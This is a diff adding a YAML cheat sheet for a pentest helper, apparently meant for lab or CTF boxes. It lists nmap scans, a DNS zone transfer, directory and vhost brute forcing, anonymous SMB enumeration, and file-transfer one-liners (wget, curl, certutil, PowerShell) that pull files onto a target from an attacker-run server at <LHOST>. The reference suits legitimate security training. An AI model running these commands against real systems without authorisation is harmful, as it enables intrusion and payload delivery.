@@ -1,0 +1,154 @@
+# Copy-only command reference. spinneret fills <IP>-style tokens from the
+# open box and copies the result. It does not execute these commands.
+# Override or extend entries by id in ~/.config/spinneret/cheatsheet.yaml
+# or in <data-root>/cheatsheet.yaml.
+entries:
+  - id: nmap-service
+    title: Service and default-script scan
+    category: Nmap
+    command: nmap -sC -sV -oA nmap/initial <IP>
+    notes: Writes nmap/initial.* in the current directory. Create the nmap folder first.
+
+  - id: nmap-all-tcp
+    title: All TCP ports
+    category: Nmap
+    command: nmap -p- -T4 --open -oA nmap/alltcp <IP>
+    notes: Follow with a service scan against the ports this list returns.
+
+  - id: nmap-udp
+    title: Top UDP ports
+    category: Nmap
+    command: nmap -sU --top-ports 50 -oA nmap/udp <IP>
+
+  - id: nmap-web
+    title: HTTP and TLS scripts
+    category: Nmap
+    command: nmap -sV -p 80,443 --script "http-enum,http-headers,ssl-cert,ssl-enum-ciphers" <IP>
+
+  - id: dig-axfr
+    title: DNS zone transfer
+    category: DNS
+    command: dig axfr <DOMAIN> @<IP>
+    notes: Ask the target DNS server for a full zone. <DOMAIN> comes from the box domain or first hostname.
+
+  - id: dig-any
+    title: DNS ANY query
+    category: DNS
+    command: dig ANY <DOMAIN> @<IP>
+
+  - id: dig-reverse
+    title: Reverse DNS
+    category: DNS
+    command: dig -x <IP>
+
+  - id: whatweb
+    title: Web fingerprint
+    category: Web
+    command: whatweb -a 3 http://<HOST>
+
+  - id: curl-headers
+    title: Response headers
+    category: Web
+    command: curl -sS -D- -o /dev/null http://<IP>
+
+  - id: curl-https
+    title: HTTPS headers, skip certificate check
+    category: Web
+    command: curl -kI https://<IP>
+
+  - id: curl-robots
+    title: robots.txt
+    category: Web
+    command: curl -sS http://<IP>/robots.txt
+
+  - id: gobuster-dir
+    title: Directory brute force
+    category: Web
+    command: gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -t 40 -o gobuster-dir.txt
+    notes: Kali's dirb common list. Swap the wordlist path if yours lives somewhere else.
+
+  - id: gobuster-vhost
+    title: Vhost brute force
+    category: Web
+    command: gobuster vhost -u http://<IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -o gobuster-vhost.txt
+    notes: SecLists path used on Kali. Point the URL at the hostname when the vhost is name-based.
+
+  - id: ffuf-dir
+    title: ffuf directories
+    category: Web
+    command: ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -o ffuf-dir.json -of json
+
+  - id: ffuf-vhost
+    title: ffuf vhosts
+    category: Web
+    command: >-
+      ffuf -u http://<IP> -H "Host: FUZZ.<DOMAIN>"
+      -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+      -o ffuf-vhost.json -of json
+
+  - id: smbclient-list
+    title: List SMB shares, no credentials
+    category: SMB
+    command: smbclient -N -L //<IP>
+
+  - id: smbclient-share
+    title: Connect to a share, no credentials
+    category: SMB
+    command: smbclient //<IP>/<SHARE> -N
+    notes: Replace <SHARE> with a name from the list command.
+
+  - id: smbmap
+    title: SMB share permissions
+    category: SMB
+    command: smbmap -H <IP>
+
+  - id: enum4linux
+    title: SMB and RPC enumeration
+    category: SMB
+    command: enum4linux-ng -A <IP>
+
+  - id: showmount
+    title: NFS exports
+    category: SMB
+    command: showmount -e <IP>
+
+  - id: http-server
+    title: Serve the current directory
+    category: Transfer
+    command: python3 -m http.server 8000 --bind <LHOST>
+    notes: Set LHOST on the box (often tun0) before copying. Leave <FILE> in the download commands for the filename you choose.
+
+  - id: wget-file
+    title: Linux wget download
+    category: Transfer
+    command: wget http://<LHOST>:8000/<FILE> -O <FILE>
+
+  - id: curl-file
+    title: Linux curl download
+    category: Transfer
+    command: curl -sS http://<LHOST>:8000/<FILE> -o <FILE>
+
+  - id: base64-encode
+    title: Base64-encode a file
+    category: Transfer
+    command: base64 -w 0 <FILE>
+
+  - id: base64-decode
+    title: Base64-decode a file
+    category: Transfer
+    command: base64 -d <FILE>.b64 > <FILE>
+
+  - id: certutil
+    title: Windows certutil download
+    category: Transfer
+    command: certutil -urlcache -split -f http://<LHOST>:8000/<FILE> <FILE>
+
+  - id: powershell-iwr
+    title: PowerShell Invoke-WebRequest download
+    category: Transfer
+    command: powershell -c "Invoke-WebRequest -Uri http://<LHOST>:8000/<FILE> -OutFile <FILE>"
+
+  - id: powershell-base64
+    title: PowerShell Base64-encode a file
+    category: Transfer
+    command: powershell -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes('<FILE>'))"
